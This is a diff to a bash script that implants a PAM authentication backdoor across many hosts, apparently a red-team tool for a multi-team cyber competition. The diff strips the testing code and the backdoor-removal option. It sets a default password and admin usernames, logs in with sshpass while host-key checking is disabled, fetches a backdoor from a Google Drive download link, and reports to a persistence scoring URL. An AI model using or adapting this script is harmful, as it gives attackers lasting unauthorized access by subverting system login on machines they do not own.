@@ -1,28 +1,16 @@
 #!/bin/bash
 
-# IPs=()
-network_id="10.10"
+IPs=()
+network_id="10.20"
 number_of_teams=10
-host_ids=(10 20 30 40 50)
-admins=("admin1" "admin2" "admin3")
+host_ids=(111 121 131)
+admins=("wburns" "cwray" "pnakasone")
 default_password="Password1!"
 timeout_duration=1
 path_to_pam="/usr/lib/x86_64-linux-gnu/security"
 backdoor_link="https://drive.usercontent.google.com/download?id=1eH1xIVb6dwKrA4Q_Ji3lzmYkxPiM2pUm&export=download&authuser=0"
-scoring_link="https://10.10.10.10"
+scoring_link="https://10.30.0.100/persist/team01"
 touch backdoored_IPs.txt
-
-# TESTING
-IPs=("127.0.0.1")
-remove_backdoor() {
-    sshpass -p "$default_password" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=$timeout_duration "admin1@127.0.0.1" "
-        echo \"$default_password\" | sudo -S cp $path_to_pam/.pam_unix.so.bak $path_to_pam/pam_unix.so
-    "
-    if [[ $? -eq 0 ]]; then
-        echo "Backdoor successfully removed at 127.0.0.1"
-    fi
-}
-# TESTING
 
 send_backdoor() {
     for IP in "${IPs[@]}"; do
@@ -38,11 +26,6 @@ send_backdoor() {
                 echo "Backdoor successfully implanted at $IP"
                 break
             fi
-
-            # TESTING
-            exit
-            # TESTING
-
         done
     done
 }
@@ -135,7 +118,6 @@ main() {
             4) print_backdoored_IPs ;;
             5) print_unbackdoored_IPs ;;
             6) break ;;
-            7) remove_backdoor ;;
             *) echo "Invalid choice. Please try again." ;;
         esac
     done
